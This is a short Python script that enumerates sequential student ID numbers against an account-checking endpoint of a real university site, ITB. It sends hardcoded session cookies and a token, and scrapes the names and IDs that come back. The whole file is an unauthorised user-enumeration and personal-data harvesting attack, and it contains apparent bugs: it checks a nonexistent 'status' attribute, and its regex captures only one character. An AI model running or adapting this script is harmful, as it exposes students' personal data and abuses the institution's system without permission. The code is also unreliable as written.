import requests
import re

pola = r"placeholder=\"(\w)*\""

url = "https://dti.itb.ac.id/nic/manajemen_akun/pengecekan_user"
cookies = {"ci_session": "2km47fv8u1kmqthhcovib631h3b5erdj", "ITBnic":"9f4b55f294d9aa09d12164aaab7dc124"}

for i in range(1,500):
    nim = str(18221000 + i)
    json = {"NICitb": "9f4b55f294d9aa09d12164aaab7dc124", 'uid': nim}

    x = requests.post(url, cookies=cookies, data=json)
    # print(x.text)

    result= re.findall(pola,x.text)
    print(result) # Dapatin nama sama nim
    
    if x.status != 200: # Kalau udah ganemu atau error stop
        break